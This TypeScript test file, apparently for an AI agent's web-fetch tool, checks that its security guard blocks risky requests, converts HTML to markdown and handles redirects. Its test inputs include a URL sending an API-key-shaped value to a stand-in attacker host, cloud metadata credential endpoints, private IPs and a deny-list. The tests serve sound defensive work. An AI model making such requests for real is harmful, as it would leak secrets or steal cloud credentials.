/**
 * web_fetch tests — mocked HTTP (no real network calls).
 *
 * The REAL security-guard module is used (not mocked) so that guard
 * integration (pre-fetch block, post-redirect block, bot detection) is tested
 * end-to-end. Only global fetch is mocked per-test to return controlled
 * responses.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { webFetch } from "./fetch.js";
import { _setDnsResolverForTest } from "./security-guard.js";

// ---------------------------------------------------------------------------
// Helpers — build mock Response objects
// ---------------------------------------------------------------------------

function mockResponse(opts: {
  text?: string;
  url?: string;
  contentType?: string;
  status?: number;
  location?: string;
}): Response {
  const headers = new Map<string, string>();
  if (opts.contentType !== undefined) {
    headers.set("content-type", opts.contentType);
  }
  if (opts.location !== undefined) {
    headers.set("location", opts.location);
  }
  return {
    url: opts.url ?? "https://example.com/page",
    status: opts.status ?? 200,
    headers: {
      get: (name: string) => headers.get(name.toLowerCase()) ?? null,
    },
    text: () => Promise.resolve(opts.text ?? ""),
  } as unknown as Response;
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe("webFetch", () => {
  const originalFetch = globalThis.fetch;

  // Stub the DNS resolver so checkUrlAsync does NOT make real network DNS
  // (hostnames resolve to a public IP → passes the SSRF range check).
  beforeEach(() => {
    _setDnsResolverForTest(async () => [
      { address: "93.184.216.34", family: 4 },
    ]);
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
    vi.restoreAllMocks();
    _setDnsResolverForTest(null);
  });

  // ── Happy path: HTML → markdown ────────────────────────────────────
  it("converts HTML to markdown with headings and paragraphs", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: '<html><head><title>Test</title></head><body><h1>Hello</h1><p>World</p></body></html>',
        contentType: "text/html; charset=utf-8",
        url: "https://example.com/page",
      }),
    );

    const result = await webFetch("https://example.com/page");

    expect(result.ok).toBe(true);
    expect(result.markdown).toContain("# Hello");
    expect(result.markdown).toContain("World");
    expect(result.title).toBe("Test");
    expect(result.contentType).toBe("text/html");
    expect(result.finalUrl).toBe("https://example.com/page");
  });

  // ── Security block: secret URL ─────────────────────────────────────
  it("blocks URLs containing API keys without making a request", async () => {
    const fetchSpy = vi.fn();
    globalThis.fetch = fetchSpy;

    const result = await webFetch(
      "https://evil.com/steal?key=sk-ant-AAAABBBBCCCCDDDD",
    );

    expect(result.ok).toBe(false);
    expect(result.guardBlock).toBeDefined();
    expect(result.guardBlock?.category).toBe("secret-url");
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  // ── Security block: cloud metadata ─────────────────────────────────
  it("blocks cloud metadata endpoints", async () => {
    const fetchSpy = vi.fn();
    globalThis.fetch = fetchSpy;

    const result = await webFetch(
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    );

    expect(result.ok).toBe(false);
    expect(result.guardBlock).toBeDefined();
    expect(result.guardBlock?.category).toBe("ssrf-metadata");
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  // ── Security block: redirect to metadata ───────────────────────────
  it("blocks redirect to metadata endpoint via post-redirect guard", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: "<html><body>secret data</body></html>",
        contentType: "text/html",
        url: "http://169.254.169.254/latest/meta-data/",
      }),
    );

    const result = await webFetch("https://example.com/redirect");

    expect(result.ok).toBe(false);
    expect(result.guardBlock).toBeDefined();
    expect(result.guardBlock?.category).toBe("ssrf-metadata");
    // Body must NOT be returned when redirect is blocked
    expect(result.markdown).toBe("");
  });

  // ── Manual redirect following: per-hop check (G1 residual MEDIUM) ─────
  it("blocks redirect to metadata via per-hop check (target never connected)", async () => {
    const fetchSpy = vi.fn().mockImplementation((u: string) =>
      Promise.resolve(
        mockResponse({
          status: 302,
          location: "http://169.254.169.254/latest/meta-data/",
          url: String(u),
        }),
      ),
    );
    globalThis.fetch = fetchSpy;

    const result = await webFetch("https://example.com/redirect");

    expect(result.ok).toBe(false);
    expect(result.guardBlock?.category).toBe("ssrf-metadata");
    // The metadata target must NOT have been fetched (per-hop check blocked it).
    const calls = fetchSpy.mock.calls.map((c) => String(c[0]));
    expect(calls).not.toContain("http://169.254.169.254/latest/meta-data/");
    expect(calls).toEqual(["https://example.com/redirect"]);
  });

  it("follows a safe redirect and returns the final content", async () => {
    const fetchSpy = vi.fn().mockImplementation((u: string) => {
      if (String(u).includes("/redirect")) {
        return Promise.resolve(
          mockResponse({
            status: 302,
            location: "https://safe.example.org/real",
            url: "https://example.com/redirect",
          }),
        );
      }
      return Promise.resolve(
        mockResponse({
          text: "<html><body><h1>Real</h1></body></html>",
          contentType: "text/html",
          url: "https://safe.example.org/real",
        }),
      );
    });
    globalThis.fetch = fetchSpy;

    const result = await webFetch("https://example.com/redirect");

    expect(result.ok).toBe(true);
    expect(result.markdown).toContain("# Real");
    expect(result.finalUrl).toBe("https://safe.example.org/real");
    expect(fetchSpy).toHaveBeenCalledTimes(2);
  });

  it("caps redirect chains at MAX_REDIRECTS", async () => {
    const fetchSpy = vi.fn().mockResolvedValue(
      mockResponse({
        status: 302,
        location: "https://example.com/loop",
        url: "https://example.com/loop",
      }),
    );
    globalThis.fetch = fetchSpy;

    const result = await webFetch("https://example.com/loop-start");

    expect(result.ok).toBe(false);
    expect(result.error).toMatch(/too many redirects/);
    // MAX_REDIRECTS = 10 → 11 fetch calls before the cap trips (initial + 10 hops).
    expect(fetchSpy.mock.calls.length).toBe(11);
  });

  // ── G2: operator deny-list from config (MYA_WEB_BLOCKLIST) ──────────
  it("applies MYA_WEB_BLOCKLIST from config (operator deny-list)", async () => {
    const fetchSpy = vi.fn();
    globalThis.fetch = fetchSpy;
    process.env.MYA_WEB_BLOCKLIST = "*.evil.com,blockthis.test";
    try {
      const result = await webFetch("https://blockthis.test/page");
      expect(result.ok).toBe(false);
      expect(result.guardBlock?.category).toBe("blocklist");
      expect(fetchSpy).not.toHaveBeenCalled();
    } finally {
      delete process.env.MYA_WEB_BLOCKLIST;
    }
  });

  // ── F2: strip Authorization/Cookie on cross-origin redirect ─────────
  it("strips Authorization on cross-origin redirect (keeps same-origin)", async () => {
    const sentHeaders = new Map<string, Record<string, string>>();
    const fetchSpy = vi.fn().mockImplementation((u: string, init?: { headers?: Record<string, string> }) => {
      sentHeaders.set(String(u), init?.headers ?? {});
      if (String(u).includes("/redirect")) {
        return Promise.resolve(
          mockResponse({
            status: 302,
            location: "https://other.example.org/real",
            url: String(u),
          }),
        );
      }
      return Promise.resolve(
        mockResponse({ text: "<html>ok</html>", contentType: "text/html", url: String(u) }),
      );
    });
    globalThis.fetch = fetchSpy;

    const result = await webFetch("https://example.com/redirect", {
      headers: { Authorization: "Bearer secret" },
    });

    expect(result.ok).toBe(true);
    // Same-origin first hop → Authorization kept.
    expect(sentHeaders.get("https://example.com/redirect")?.Authorization).toBe("Bearer secret");
    // Cross-origin redirect target → Authorization stripped (F2).
    expect(sentHeaders.get("https://other.example.org/real")?.Authorization).toBeUndefined();
  });

  // ── Content type: JSON → pretty-printed ────────────────────────────
  it("pretty-prints JSON responses", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: '{"name":"test","value":42}',
        contentType: "application/json",
      }),
    );

    const result = await webFetch("https://example.com/api");

    expect(result.ok).toBe(true);
    expect(result.markdown).toContain('"name": "test"');
    expect(result.markdown).toContain('"value": 42');
  });

  // ── Content type: text/plain → returned as-is ──────────────────────
  it("returns text/plain responses as-is", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: "just some plain text\nline two",
        contentType: "text/plain",
      }),
    );

    const result = await webFetch("https://example.com/readme.txt");

    expect(result.ok).toBe(true);
    expect(result.markdown).toBe("just some plain text\nline two");
  });

  // ── Truncation ─────────────────────────────────────────────────────
  it("truncates output exceeding maxChars with a note", async () => {
    const bigBody = "A".repeat(100_000);
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: bigBody,
        contentType: "text/plain",
      }),
    );

    const result = await webFetch("https://example.com/big", {
      maxChars: 1000,
    });

    expect(result.ok).toBe(true);
    expect(result.markdown.length).toBeLessThan(100_000);
    expect(result.markdown).toContain("[... truncated at 1000 chars");
    expect(result.markdown).toContain("original was 100000 chars ...]");
  });

  // ── Bot detection ──────────────────────────────────────────────────
  it("includes botDetected when title matches bot-detection patterns", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: '<html><head><title>Just a moment...</title></head><body>checking your browser</body></html>',
        contentType: "text/html",
      }),
    );

    const result = await webFetch("https://example.com/protected");

    expect(result.ok).toBe(true);
    expect(result.botDetected).toBeDefined();
    expect(result.botDetected?.patterns.length).toBeGreaterThan(0);
  });

  it("does not include botDetected for normal titles", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: '<html><head><title>Welcome Home</title></head><body><p>content</p></body></html>',
        contentType: "text/html",
      }),
    );

    const result = await webFetch("https://example.com/normal");

    expect(result.ok).toBe(true);
    expect(result.botDetected).toBeUndefined();
  });

  // ── Timeout ────────────────────────────────────────────────────────
  it("returns timeout error when fetch does not resolve in time", async () => {
    globalThis.fetch = vi.fn().mockImplementation(
      (_url: string, init?: RequestInit) =>
        new Promise((_resolve, reject) => {
          // Simulate AbortSignal.timeout firing
          const signal = init?.signal;
          if (signal) {
            signal.addEventListener("abort", () => {
              const err = new Error("The operation was aborted due to timeout");
              err.name = "TimeoutError";
              reject(err);
            });
          }
        }),
    );

    const result = await webFetch("https://example.com/slow", {
      timeoutMs: 100,
    });

    expect(result.ok).toBe(false);
    expect(result.error).toMatch(/timed out/i);
    expect(result.guardBlock).toBeUndefined();
  });

  // ── Error handling: fetch rejects ──────────────────────────────────
  it("returns error when fetch rejects", async () => {
    globalThis.fetch = vi.fn().mockRejectedValue(new Error("ECONNREFUSED"));

    const result = await webFetch("https://example.com/down");

    expect(result.ok).toBe(false);
    expect(result.error).toBe("ECONNREFUSED");
    expect(result.markdown).toBe("");
  });

  // ── HTML conversion: multiple elements ─────────────────────────────
  it("converts links, bold, italic, code, and lists", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: `<html><body>
          <h2>Section</h2>
          <p>This is <strong>bold</strong> and <em>italic</em>.</p>
          <ul><li>One</li><li>Two</li></ul>
          <p>See <a href="https://example.com/link">the link</a> and <code>code()</code>.</p>
          <pre><code>const x = 1;</code></pre>
        </body></html>`,
        contentType: "text/html",
      }),
    );

    const result = await webFetch("https://example.com/rich");

    expect(result.ok).toBe(true);
    expect(result.markdown).toContain("## Section");
    expect(result.markdown).toContain("**bold**");
    expect(result.markdown).toContain("*italic*");
    expect(result.markdown).toContain("[the link](https://example.com/link)");
    expect(result.markdown).toContain("`code()`");
    expect(result.markdown).toContain("- One");
    expect(result.markdown).toContain("- Two");
    expect(result.markdown).toContain("```");
    expect(result.markdown).toContain("const x = 1;");
  });

  // ── HTML conversion: strips script/style/nav ───────────────────────
  it("strips script, style, nav, footer, and header content", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: `<html><body>
          <script>alert('xss')</script>
          <style>.hidden { display: none; }</style>
          <nav><a href="/home">Home</a></nav>
          <header>Site Header</header>
          <footer>Copyright 2024</footer>
          <p>Visible content</p>
        </body></html>`,
        contentType: "text/html",
      }),
    );

    const result = await webFetch("https://example.com/stripped");

    expect(result.ok).toBe(true);
    expect(result.markdown).toContain("Visible content");
    expect(result.markdown).not.toContain("alert");
    expect(result.markdown).not.toContain("display: none");
    expect(result.markdown).not.toContain("Home");
    expect(result.markdown).not.toContain("Site Header");
    expect(result.markdown).not.toContain("Copyright");
  });

  // ── HTML entity decoding ───────────────────────────────────────────
  it("decodes HTML entities in content", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: '<html><body><p>5 &lt; 10 &amp;&amp; 10 &gt; 5 &quot;quotes&quot; &#39;apos&#39;</p></body></html>',
        contentType: "text/html",
      }),
    );

    const result = await webFetch("https://example.com/entities");

    expect(result.ok).toBe(true);
    expect(result.markdown).toContain("5 < 10 && 10 > 5");
    expect(result.markdown).toContain('"quotes"');
    expect(result.markdown).toContain("'apos'");
  });

  // ── Unsupported content type ───────────────────────────────────────
  it("returns raw content with note for unsupported types", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: "binary-ish data here",
        contentType: "application/octet-stream",
      }),
    );

    const result = await webFetch("https://example.com/blob");

    expect(result.ok).toBe(true);
    expect(result.markdown).toContain("binary-ish data here");
    expect(result.markdown).toContain("unsupported content type");
  });

  // ── Default User-Agent ─────────────────────────────────────────────
  it("sets a default User-Agent header", async () => {
    const fetchSpy = vi.fn().mockResolvedValue(
      mockResponse({
        text: "ok",
        contentType: "text/plain",
      }),
    );
    globalThis.fetch = fetchSpy;

    await webFetch("https://example.com/check-ua");

    expect(fetchSpy).toHaveBeenCalledTimes(1);
    const callArgs = fetchSpy.mock.calls[0];
    const init = callArgs?.[1] as RequestInit | undefined;
    const headers = init?.headers as Record<string, string> | undefined;
    expect(headers?.["User-Agent"]).toBeDefined();
  });

  it("preserves custom User-Agent header", async () => {
    const fetchSpy = vi.fn().mockResolvedValue(
      mockResponse({
        text: "ok",
        contentType: "text/plain",
      }),
    );
    globalThis.fetch = fetchSpy;

    await webFetch("https://example.com/check-ua", {
      headers: { "User-Agent": "custom-agent/2.0" },
    });

    const callArgs = fetchSpy.mock.calls[0];
    const init = callArgs?.[1] as RequestInit | undefined;
    const headers = init?.headers as Record<string, string> | undefined;
    expect(headers?.["User-Agent"]).toBe("custom-agent/2.0");
  });

  // ── Private IP blocking ────────────────────────────────────────────
  it("blocks private IP addresses by default", async () => {
    const fetchSpy = vi.fn();
    globalThis.fetch = fetchSpy;

    const result = await webFetch("http://10.0.0.1/internal");

    expect(result.ok).toBe(false);
    expect(result.guardBlock?.category).toBe("ssrf-private");
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("allows private IP addresses when allowPrivateUrls is true", async () => {
    globalThis.fetch = vi.fn().mockResolvedValue(
      mockResponse({
        text: "internal content",
        contentType: "text/plain",
      }),
    );

    const result = await webFetch("http://10.0.0.1/internal", {
      allowPrivateUrls: true,
    });

    expect(result.ok).toBe(true);
    expect(result.markdown).toBe("internal content");
  });

  it("still blocks metadata even with allowPrivateUrls", async () => {
    const fetchSpy = vi.fn();
    globalThis.fetch = fetchSpy;

    const result = await webFetch("http://169.254.169.254/meta", {
      allowPrivateUrls: true,
    });

    expect(result.ok).toBe(false);
    expect(result.guardBlock?.category).toBe("ssrf-metadata");
    expect(fetchSpy).not.toHaveBeenCalled();
  });
});
